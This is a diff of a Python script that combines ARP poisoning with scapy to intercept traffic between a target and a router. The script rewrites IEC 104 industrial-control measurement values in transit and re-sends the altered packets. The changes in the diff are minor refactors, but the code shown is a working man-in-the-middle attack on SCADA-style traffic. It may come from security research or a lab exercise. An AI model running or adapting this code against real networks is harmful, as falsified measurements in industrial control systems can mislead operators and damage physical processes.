@@ -2,18 +2,19 @@
 
 """
     Use scapy to modify packets going through your machine.
-    Based on nfqueue to block packets in the kernel and pass them to scapy for validation
-"""
 
+"""
 
 from ARP_poisoning import *
 from iec104lib import *
 
+instance = ARP_poisoning()
+
 ip_router = ARP_poisoning.router_ip
 ip_target = ARP_poisoning.target_ip
 ip_attack = ARP_poisoning.attack_ip
-mac_router = ARP_poisoning.get_mac(ip_router)
-mac_target = ARP_poisoning.get_mac(ip_target)
+mac_router = ARP_poisoning().get_mac(ip_router)
+mac_target = ARP_poisoning().get_mac(ip_target)
 
 interface = "en0"
 
@@ -41,8 +42,8 @@ def modify_packet_for_router(chosen_packet):
 
 
 def modify_mesure_packet(chosen_packet):
-	## TODO connect with DL and neural network solution
-#	value = 0
+    ## TODO connect with DL and neural network solution
+    #   value = 0
     chosen_packet[asdu_infobj_13].value += hex(1)
 
     # delete the checksum so that scapy will handle them and recalculate them
@@ -89,8 +90,7 @@ def mitm(chosen_packet):
 
         send(chosen_packet, verbose=False)
 
-    if chosen_packet[Ether].src == mac_target and chosen_packet[IP].src == ip_target and chosen_packet[
-        IP].dst == ip_router:
+    if chosen_packet[Ether].src == mac_target and chosen_packet[IP].src == ip_target and chosen_packet[IP].dst == ip_router:
         modify_packet_for_router(chosen_packet)
         send(chosen_packet, verbose=False)
 
@@ -104,7 +104,7 @@ def loop_sleep():
 
 
 def main_sniff():
-    ARP_poisoning.stop_ip_forward()
+    ARP_poisoning().stop_ip_forward()
     print("MitM with sniffing & IEC 104 packet modification until ctrl-c")
     sniff(prn=mitm, filter="ip")
 
@@ -112,7 +112,7 @@ def main_sniff():
     print("MitM with full forward until Keyboard Interruption")
     loop_sleep()
     print("")
-    ARP_poisoning.stop_ip_forward()
+    ARP_poisoning().stop_ip_forward()
 
 
 if __name__ == "__main__":
